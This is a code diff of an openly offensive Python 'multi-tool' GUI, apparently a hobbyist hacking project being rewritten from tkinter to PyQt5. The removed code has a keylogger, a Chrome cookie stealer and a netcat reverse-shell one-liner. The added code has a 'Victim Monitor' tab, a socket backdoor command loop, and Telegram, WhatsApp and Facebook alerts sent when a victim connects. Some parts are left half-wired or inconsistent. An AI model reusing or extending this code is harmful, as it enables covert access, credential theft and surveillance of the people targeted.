@@ -2,300 +2,283 @@ import socket
 import subprocess
 import nmap
 import threading
-import tkinter as tk
-from tkinter import simpledialog, messagebox, scrolledtext
-from tkinter import ttk
 import logging
 from logging.handlers import RotatingFileHandler
 import browser_cookie3
-from pynput import keyboard
+import autopy
+from PyQt5 import QtWidgets, QtCore
 import requests
-from bs4 import BeautifulSoup
-import re
+from telethon import TelegramClient  # Telegram bot integration
+import pywhatkit as kit  # WhatsApp API support
+import facebook
+import openai  # OpenAI for AI-guided error handling
+import os
+import sys
+import asyncio  # Ensure we handle async functions correctly
+import json
+from PyQt5.QtGui import QTextCursor
 
-# Setup Logging with Rotation
-log_file = 'multi_tool.log'
-log_handler = RotatingFileHandler(log_file, maxBytes=1024*1024, backupCount=5)  # 1MB per log, 5 backups
-logging.basicConfig(handlers=[log_handler], level=logging.INFO, 
+# ===================== Logging Setup ===================== #
+if not os.path.exists('logs'):
+    os.makedirs('logs')
+
+log_file = os.path.join('logs', 'multi_tool.log')
+log_handler = RotatingFileHandler(log_file, maxBytes=1024 * 1024, backupCount=5)
+logging.basicConfig(handlers=[log_handler], level=logging.INFO,
                     format='%(asctime)s - %(levelname)s - %(message)s')
 
-# Constants
+# Constants for Bot Setup
 LHOST = "localhost"
 RHOST = "target_ip"
 PROXY = "proxy_ip:proxy_port"
 NMAP_ARGS = "-Pn -sT -O"
 
-# Banner to be printed
-def print_banner():
-    """Prints the banner for the tool."""
-    banner = """
-    ███╗   ██╗██╗   ██╗██╗     ██████╗██╗   ██╗██╗      ██████╗██╗
-    ████╗  ██║██║   ██║██║     ██╔════╝██║   ██║██║     ██╔════╝██║
-    ██╔██╗ ██║██║   ██║██║     ██║     ███████║██║     ██║     ██║
-    ██║╚██╗██║██║   ██║██║     ██║     ██╔══██║██║     ██║     ██║
-    ██║ ╚████║╚██████╔╝███████╗╚██████╗██║  ██║███████╗╚██████╗██║
-    ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝
-    MultiToolV5 - Enhanced Multi-Tool for Pentesting 🛠️
-    """
-    print(banner)
+# Load API Credentials from config file
+with open('config/api_credentials.json', 'r') as cred_file:
+    api_credentials = json.load(cred_file)
 
-# ===================== Utility Functions ===================== #
+API_ID = api_credentials['telegram_api_id']
+API_HASH = api_credentials['telegram_api_hash']
+BOT_TOKEN = api_credentials['telegram_bot_token']
+FACEBOOK_TOKEN = api_credentials['facebook_access_token']
+WHATSAPP_PHONE_NUMBER = api_credentials['whatsapp_phone_number']
+openai.api_key = api_credentials["openai_api_key"]
 
-def show_message(title, message):
-    """Show a simple message box."""
-    messagebox.showinfo(title, message)
+# Initialize Telegram Client
+telegram_client = TelegramClient('bot', API_ID, API_HASH)
 
-def handle_exception(exception):
-    """Log and display an exception."""
-    logging.error(str(exception))
-    messagebox.showerror("Error", str(exception))
+# ===================== API Key Validation ===================== #
+def validate_api_keys(output_area, credentials):
+    """Validate that all necessary API keys are provided."""
+    missing_keys = [key for key, value in credentials.items() if not value]
+    if missing_keys:
+        missing_str = ", ".join(missing_keys)
+        output_area.setTextColor(QtCore.Qt.red)
+        output_area.append(f"❌ Error: Missing API keys for {missing_str}\n")
+        logging.error(f"Missing API keys: {missing_str}")
+        return False
+    output_area.setTextColor(QtCore.Qt.green)
+    output_area.append("✅ All API keys validated.\n")
+    return True
 
-# ===================== Scanning Functions ===================== #
-
-def scan_target(rhost, output_area):
-    """Perform a passive scan using Nmap and output results to the GUI."""
+# ===================== AI Error Handling ===================== #
+def detect_and_fix_errors(error_message, output_area):
+    """Use OpenAI to suggest fixes for detected errors."""
     try:
-        logging.info(f"Starting scan for target: {rhost}")
+        response = openai.Completion.create(
+            model="text-davinci-003",
+            prompt=f"Error detected: {error_message}. Suggest a fix.",
+            max_tokens=150
+        )
+        suggestion = response.choices[0].text.strip()
+        output_area.setTextColor(QtCore.Qt.yellow)
+        output_area.append(f"💡 AI Suggestion: {suggestion}")
+    except Exception as e:
+        output_area.setTextColor(QtCore.Qt.red)
+        output_area.append(f"❌ AI Error Detection Failed: {str(e)}")
+
+# ===================== Bot Notifications ===================== #
+async def telegram_bot_notify(message, output_area):
+    """Send a message to Telegram asynchronously and handle errors."""
+    try:
+        if not telegram_client.is_connected():
+            await telegram_client.start(bot_token=BOT_TOKEN)
+        await telegram_client.send_message('me', message)
+        output_area.setTextColor(QtCore.Qt.green)
+        output_area.append("✅ Telegram notification sent.\n")
+    except Exception as e:
+        handle_exception(e, output_area)
+
+def send_telegram_notification_async(message, output_area):
+    """Helper function to run async Telegram notifications from GUI thread."""
+    asyncio.create_task(telegram_bot_notify(message, output_area))
+
+def whatsapp_notify(message, phone_number, output_area):
+    """Send a WhatsApp message using pyWhatKit."""
+    try:
+        kit.sendwhatmsg_instantly(phone_number, message)
+        output_area.setTextColor(QtCore.Qt.green)
+        output_area.append("✅ WhatsApp message sent successfully.\n")
+        logging.info(f"WhatsApp message sent to {phone_number}")
+    except Exception as e:
+        handle_exception(e, output_area)
+
+def setup_facebook_bot(output_area):
+    """Send a notification via Facebook."""
+    try:
+        graph = facebook.GraphAPI(access_token=FACEBOOK_TOKEN)
+        graph.put_object(parent_object='me', connection_name='feed', message="Monitoring vulnerabilities.")
+        output_area.setTextColor(QtCore.Qt.green)
+        output_area.append("✅ Facebook bot setup complete.")
+    except Exception as e:
+        handle_exception(e, output_area)
+
+# ===================== Victim Monitoring ===================== #
+victims = []
+
+def add_victim(ip_address, output_area):
+    """Monitor victim and notify via bots."""
+    if not validate_ip(ip_address):
+        output_area.setTextColor(QtCore.Qt.red)
+        output_area.append(f"❌ Invalid IP address: {ip_address}\n")
+        logging.error(f"Attempted to monitor invalid IP address: {ip_address}")
+        return
+
+    victims.append(ip_address)
+    output_area.setTextColor(QtCore.Qt.green)
+    output_area.append(f"✅ Monitoring victim: {ip_address}\n")
+    
+    message = f"⚠️ Vulnerability detected at {ip_address}."
+    send_telegram_notification_async(message, output_area)
+    whatsapp_notify(message, WHATSAPP_PHONE_NUMBER, output_area)
+
+def validate_ip(ip):
+    """Validate if the given string is a valid IP address."""
+    import re
+    ip_pattern = r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$"
+    return re.match(ip_pattern, ip) is not None
+
+# ===================== Scanning and Backdoor ===================== #
+def scan_target(rhost, output_area):
+    """Scan target using Nmap."""
+    try:
         nm = nmap.PortScanner()
         nm.scan(rhost, arguments=NMAP_ARGS)
-        os_info = get_os_info(nm, rhost)
-        result = f"Target OS: {os_info}\n{nm.csv()}"
-        output_area.insert(tk.END, result + '\n')
+        result = f"🖥️ Target OS: {nm[rhost]['osclass'][0]['osfamily']}\n{nm.csv()}"
+        output_area.setTextColor(QtCore.Qt.green)
+        output_area.append(result)
     except Exception as e:
         handle_exception(e)
 
-def get_os_info(nm, rhost):
-    """Extract OS information from Nmap results."""
+def create_backdoor(lhost, port=8080, output_area=None, stop_event=None):
+    """Create a backdoor and notify via bots."""
     try:
-        return nm[rhost].get('osmatch', [{}])[0].get('name', 'Unknown')
-    except KeyError:
-        logging.warning(f"OS information not available for: {rhost}")
-        return "Unknown OS"
-
-# ===================== Listener & Backdoor ===================== #
-
-def create_backdoor(lhost, port=8080, output_area=None):
-    """Create a simple backdoor using sockets."""
-    try:
-        logging.info(f"Creating backdoor on {lhost}:{port}")
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.bind((lhost, port))
         sock.listen(1)
-        output_area.insert(tk.END, f"Listening on {lhost}:{port}...\n")
+        output_area.setTextColor(QtCore.Qt.blue)
+        output_area.append(f"🔒 Listening on {lhost}:{port}...\n")
         conn, addr = sock.accept()
-        output_area.insert(tk.END, f"Connection established with {addr}\n")
-        while True:
-            cmd = simpledialog.askstring("Command Input", "Enter command:")
-            if cmd.lower() in ['exit', 'quit']:
-                logging.info("Backdoor session terminated by user.")
+        output_area.setTextColor(QtCore.Qt.green)
+        output_area.append(f"🔓 Connection established with {addr}\n")
+
+        message = f"⚠️ Backdoor connection established with {addr}"
+        send_telegram_notification_async(message, output_area)
+        whatsapp_notify(message, WHATSAPP_PHONE_NUMBER, output_area)
+        
+        while not stop_event.is_set():
+            cmd, ok = QtWidgets.QInputDialog.getText(None, "Command Input", "Enter command:")
+            if not ok or cmd.lower() in ['exit', 'quit']:
                 break
             conn.sendall(cmd.encode())
             response = conn.recv(4096).decode()
-            output_area.insert(tk.END, response + '\n')
+            output_area.setTextColor(QtCore.Qt.green)
+            output_area.append(response + '\n')
         conn.close()
     except Exception as e:
         handle_exception(e)
 
-def create_listener(lhost, port=8081, output_area=None):
-    """Create a listener to receive incoming connections."""
-    try:
-        logging.info(f"Creating listener on {lhost}:{port}")
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.bind((lhost, port))
-        sock.listen(1)
-        output_area.insert(tk.END, f"Listening on {lhost}:{port}...\n")
-        conn, addr = sock.accept()
-        output_area.insert(tk.END, f"Connected to {addr}\n")
-        while True:
-            data = conn.recv(4096).decode()
-            if not data:
-                break
-            output_area.insert(tk.END, f"Received: {data}\n")
-        conn.close()
-    except Exception as e:
-        handle_exception(e)
+# ===================== Error Handling ===================== #
+def handle_exception(exception, output_area=None):
+    """Log and handle exceptions."""
+    error_message = str(exception)
+    logging.error(error_message)
+    if output_area:
+        output_area.setTextColor(QtCore.Qt.red)
+        output_area.append(f"❌ Error: {error_message}")
+        detect_and_fix_errors(error_message, output_area)
 
-# ===================== Terminal & AI ===================== #
+# ===================== GUI Application ===================== #
+class MultiToolV4(QtWidgets.QMainWindow):
+    """Main GUI for MultiToolV4."""
+    
+    def __init__(self):
+        super().__init__()
+        self.init_ui()
+        self.stop_event = threading.Event()
 
-def run_terminal_command(command, output_area):
-    """Run any command from the terminal tab."""
-    try:
-        logging.info(f"Running command: {command}")
-        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        output, error = process.communicate()
-        output_area.insert(tk.END, output.decode() + '\n')
-        if error:
-            output_area.insert(tk.END, error.decode() + '\n')
-    except Exception as e:
-        handle_exception(e)
+    def init_ui(self):
+        self.setWindowTitle('MultiToolV4 by kdairatchi 🛠️')
+        self.setGeometry(100, 100, 800, 600)
 
-def ai_suggestions(query, output_area):
-    """Simulate AI suggestions for pentesting tasks based on user input."""
-    suggestions = {
-        "scan": "Use nmap or masscan for scanning. Example: nmap -sS -T4 target_ip",
-        "exploit": "Use Metasploit for exploitation. Example: msfconsole -> search exploit.",
-        "backdoor": "Reverse shell: nc -e /bin/bash target_ip 4444",
-        "password": "Password cracking: Use Hydra or John the Ripper."
-    }
+        # Central Widget
+        central_widget = QtWidgets.QWidget(self)
+        self.setCentralWidget(central_widget)
+        layout = QtWidgets.QVBoxLayout(central_widget)
 
-    for key in suggestions:
-        if key in query.lower():
-            output_area.insert(tk.END, suggestions[key] + "\n")
-            return
-    output_area.insert(tk.END, "No AI suggestion found for the query.\n")
+        # Tabs
+        self.tabs = QtWidgets.QTabWidget()
+        layout.addWidget(self.tabs)
 
-# ===================== Keylogger & Cookie Stealer ===================== #
+        # Bot Setup Tab
+        self.add_bot_tab()
+        
+        # Victim Monitoring Tab
+        self.add_victim_monitor_tab()
 
-def start_keylogger(output_area):
-    """Start a simple keylogger."""
-    def on_press(key):
-        try:
-            output_area.insert(tk.END, f'{key.char}\n')
-        except AttributeError:
-            output_area.insert(tk.END, f'{key}\n')
+        # Error Handling Tab
+        self.add_error_handling_tab()
 
-    listener = keyboard.Listener(on_press=on_press)
-    listener.start()
-    output_area.insert(tk.END, "Keylogger started...\n")
+        self.show()
 
-def steal_cookies(output_area):
-    """Steal cookies from the browser."""
-    try:
-        output_area.insert(tk.END, "Stealing cookies from Chrome...\n")
-        cj = browser_cookie3.chrome()
-        for cookie in cj:
-            output_area.insert(tk.END, f"Cookie: {cookie}\n")
-        output_area.insert(tk.END, "Finished stealing cookies.\n")
-    except Exception as e:
-        handle_exception(e)
+    def add_bot_tab(self):
+        """Add bot setup tab."""
+        bot_tab = QtWidgets.QWidget()
+        self.bot_output = QtWidgets.QTextEdit()
+        self.bot_output.setReadOnly(True)
+        setup_button = QtWidgets.QPushButton("Setup Bots 🚀")
+        setup_button.clicked.connect(lambda: self.setup_bots())
+        layout = QtWidgets.QVBoxLayout(bot_tab)
+        layout.addWidget(self.bot_output)
+        layout.addWidget(setup_button)
+        self.tabs.addTab(bot_tab, "Bot Setup 🤖")
 
-# ===================== DNS Tab Functions ===================== #
+    def add_victim_monitor_tab(self):
+        """Add victim monitoring tab."""
+        victim_tab = QtWidgets.QWidget()
+        self.victim_output = QtWidgets.QTextEdit()
+        self.victim_output.setReadOnly(True)
+        victim_ip_input = QtWidgets.QLineEdit()
+        victim_ip_input.setPlaceholderText("Enter victim's IP address")
+        add_victim_button = QtWidgets.QPushButton("Add Victim 🎯")
+        add_victim_button.clicked.connect(lambda: add_victim(victim_ip_input.text(), self.victim_output))
+        layout = QtWidgets.QVBoxLayout(victim_tab)
+        layout.addWidget(victim_ip_input)
+        layout.addWidget(self.victim_output)
+        layout.addWidget(add_victim_button)
+        self.tabs.addTab(victim_tab, "Victim Monitor 🔍")
 
-def dns_lookup(domain, output_area):
-    """Perform DNS lookup for a given domain."""
-    try:
-        result = socket.gethostbyname(domain)
-        output_area.insert(tk.END, f"DNS Lookup Result for {domain}: {result}\n")
-    except Exception as e:
-        handle_exception(e)
+    def add_error_handling_tab(self):
+        """Add AI error handling tab."""
+        error_handling_tab = QtWidgets.QWidget()
+        self.error_output = QtWidgets.QTextEdit()
+        self.error_output.setReadOnly(True)
+        layout = QtWidgets.QVBoxLayout(error_handling_tab)
+        layout.addWidget(self.error_output)
+        self.tabs.addTab(error_handling_tab, "Error Handling ⚠️")
 
-def dns_zone_transfer(domain, output_area):
-    """Simulate a DNS Zone Transfer."""
-    try:
-        output_area.insert(tk.END, f"Simulating DNS Zone Transfer for {domain} (Dummy Function)...\n")
-        # In a real tool, we would use DNS libraries to do actual zone transfer.
-    except Exception as e:
-        handle_exception(e)
+    def setup_bots(self):
+        """Setup bots and notify users via Telegram and WhatsApp."""
+        if validate_api_keys(self.bot_output, api_credentials):
+            try:
+                message = "🤖 Bots connected to APIs."
+                self.bot_output.append(message)
+                send_telegram_notification_async("Bots are active. 🔔", self.bot_output)
+                setup_facebook_bot(self.bot_output)
+            except Exception as e:
+                handle_exception(e, self.bot_output)
 
-# ===================== VS Code-Like Notes Tab ===================== #
+    def start_backdoor_thread(self):
+        self.stop_event.clear()
+        threading.Thread(target=create_backdoor, args=(LHOST, 8080, self.bot_output, self.stop_event), daemon=True).start()
 
-def create_notes_tab(output_area):
-    """A simple note-taking tab similar to VS Code."""
-    try:
-        output_area.insert(tk.END, "You can use this section to take notes...\n")
-    except Exception as e:
-        handle_exception(e)
+    def stop_backdoor_thread(self):
+        self.stop_event.set()
 
-# ===================== GUI & Application ===================== #
-
-def create_gui():
-    """Create the main GUI with tabbed interface."""
-    root = tk.Tk()
-    root.title("Multi Tool V5 by kdairatchi")
-
-    # Create notebook for tabs
-    notebook = ttk.Notebook(root)
-    notebook.pack(expand=True, fill='both')
-
-    # Backdoor Tab
-    backdoor_tab = ttk.Frame(notebook)
-    notebook.add(backdoor_tab, text="Backdoor")
-    backdoor_output = scrolledtext.ScrolledText(backdoor_tab, wrap=tk.WORD)
-    backdoor_output.pack(expand=True, fill='both')
-    backdoor_button = tk.Button(backdoor_tab, text="Start Backdoor", 
-                                command=lambda: threading.Thread(target=create_backdoor, 
-                                                                  args=(LHOST, 8080, backdoor_output),
-                                                                  daemon=True).start())
-    backdoor_button.pack(pady=5)
-
-    # Listener Tab
-    listener_tab = ttk.Frame(notebook)
-    notebook.add(listener_tab, text="Listener")
-    listener_output = scrolledtext.ScrolledText(listener_tab, wrap=tk.WORD)
-    listener_output.pack(expand=True, fill='both')
-    listener_button = tk.Button(listener_tab, text="Start Listener", 
-                                command=lambda: threading.Thread(target=create_listener, 
-                                                                  args=(LHOST, 8081, listener_output),
-                                                                  daemon=True).start())
-    listener_button.pack(pady=5)
-
-    # Terminal Tab
-    terminal_tab = ttk.Frame(notebook)
-    notebook.add(terminal_tab, text="Terminal")
-    terminal_output = scrolledtext.ScrolledText(terminal_tab, wrap=tk.WORD)
-    terminal_output.pack(expand=True, fill='both')
-    terminal_command = tk.Entry(terminal_tab)
-    terminal_command.pack(fill='x', padx=10, pady=5)
-    terminal_button = tk.Button(terminal_tab, text="Run Command", 
-                                command=lambda: run_terminal_command(terminal_command.get(), terminal_output))
-    terminal_button.pack(pady=5)
-
-    # Pentest AI Tab
-    ai_tab = ttk.Frame(notebook)
-    notebook.add(ai_tab, text="Pentest AI")
-    ai_output = scrolledtext.ScrolledText(ai_tab, wrap=tk.WORD)
-    ai_output.pack(expand=True, fill='both')
-    ai_query = tk.Entry(ai_tab)
-    ai_query.pack(fill='x', padx=10, pady=5)
-    ai_button = tk.Button(ai_tab, text="Ask AI", 
-                          command=lambda: ai_suggestions(ai_query.get(), ai_output))
-    ai_button.pack(pady=5)
-
-    # Keylogger Tab
-    keylogger_tab = ttk.Frame(notebook)
-    notebook.add(keylogger_tab, text="Keylogger")
-    keylogger_output = scrolledtext.ScrolledText(keylogger_tab, wrap=tk.WORD)
-    keylogger_output.pack(expand=True, fill='both')
-    keylogger_button = tk.Button(keylogger_tab, text="Start Keylogger", 
-                                 command=lambda: threading.Thread(target=start_keylogger, 
-                                                                   args=(keylogger_output,), 
-                                                                   daemon=True).start())
-    keylogger_button.pack(pady=5)
-
-    # Cookie Stealer Tab
-    cookie_tab = ttk.Frame(notebook)
-    notebook.add(cookie_tab, text="Cookie Stealer")
-    cookie_output = scrolledtext.ScrolledText(cookie_tab, wrap=tk.WORD)
-    cookie_output.pack(expand=True, fill='both')
-    cookie_button = tk.Button(cookie_tab, text="Steal Cookies", 
-                              command=lambda: steal_cookies(cookie_output))
-    cookie_button.pack(pady=5)
-
-    # DNS Tab
-    dns_tab = ttk.Frame(notebook)
-    notebook.add(dns_tab, text="DNS Tools")
-    dns_output = scrolledtext.ScrolledText(dns_tab, wrap=tk.WORD)
-    dns_output.pack(expand=True, fill='both')
-    dns_domain = tk.Entry(dns_tab)
-    dns_domain.pack(fill='x', padx=10, pady=5)
-    dns_lookup_button = tk.Button(dns_tab, text="DNS Lookup", 
-                                  command=lambda: dns_lookup(dns_domain.get(), dns_output))
-    dns_lookup_button.pack(pady=5)
-    dns_zone_button = tk.Button(dns_tab, text="DNS Zone Transfer", 
-                                command=lambda: dns_zone_transfer(dns_domain.get(), dns_output))
-    dns_zone_button.pack(pady=5)
-
-    # VS Code Notes Tab
-    notes_tab = ttk.Frame(notebook)
-    notebook.add(notes_tab, text="VS Code Notes")
-    notes_output = scrolledtext.ScrolledText(notes_tab, wrap=tk.WORD)
-    notes_output.pack(expand=True, fill='both')
-    notes_button = tk.Button(notes_tab, text="Create Notes", 
-                             command=lambda: create_notes_tab(notes_output))
-    notes_button.pack(pady=5)
-
-    root.mainloop()
+def main():
+    app = QtWidgets.QApplication(sys.argv)
+    gui = MultiToolV4()
+    sys.exit(app.exec_())
 
 if __name__ == "__main__":
-    print_banner()
-    create_gui()
+    main()
